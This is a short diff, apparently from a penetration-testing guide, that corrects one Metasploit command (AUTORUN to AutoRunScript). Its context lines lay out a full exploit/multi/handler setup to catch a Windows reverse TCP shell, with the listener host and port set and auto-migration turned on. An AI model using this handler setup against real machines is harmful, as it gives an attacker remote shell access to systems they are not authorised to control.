@@ -682,7 +682,7 @@ msf > use exploit/multi/handler
 msf exploit(handler) > set PAYLOAD windows/shell_reverse_tcp
 msf exploit(handler) > set LHOST 10.11.0.5
 msf exploit(handler) > set LPORT 4444
-msf exploit(handler) > set AUTORUN migrate -f
+msf exploit(handler) > set AutoRunScript migrate -f
 msf exploit(handler) > run -jz
 ```
 
